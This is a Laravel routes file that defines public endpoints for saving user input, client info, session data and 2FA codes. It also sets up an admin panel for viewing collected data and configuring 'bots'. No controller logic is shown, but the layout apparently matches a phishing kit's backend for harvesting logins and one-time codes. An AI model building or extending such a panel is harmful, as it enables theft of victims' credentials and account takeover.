<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\UserInputController;
use App\Http\Controllers\AdminController;

Route::get('/', [HomeController::class, 'index'])->name('home');
Route::post('/user-input', [UserInputController::class, 'store'])->name('user-input.store');
Route::post('/save-client-info', [UserInputController::class, 'saveClientInfo'])->name('user-input.client-info');
Route::post('/save-session-data', [UserInputController::class, 'store'])->name('user-input.session-data');
Route::post('/save-2fa', [UserInputController::class, 'save2FA'])->name('user-input.save2FA');
Route::get('/success', function () {
    return view('success');
})->name('success');

// Admin routes
Route::get('admin/login', [AdminController::class, 'showLoginForm'])->name('admin.login');
Route::post('admin/login', [AdminController::class, 'login']);
Route::get('admin/dashboard', [AdminController::class, 'showDashboard'])->name('admin.dashboard')->middleware('auth');
Route::post('admin/logout', [AdminController::class, 'logout'])->name('admin.logout');

Route::middleware(['auth'])->group(function () {
    Route::get('admin/data', [AdminController::class, 'showData'])->name('admin.data');
    Route::get('admin/bots', [AdminController::class, 'showBots'])->name('admin.bots');
    Route::post('admin/bots', [AdminController::class, 'storeBotConfig'])->name('admin.bots.store');
    Route::delete('admin/bots/{id}', [AdminController::class, 'deleteBotConfig'])->name('admin.bots.delete');
});
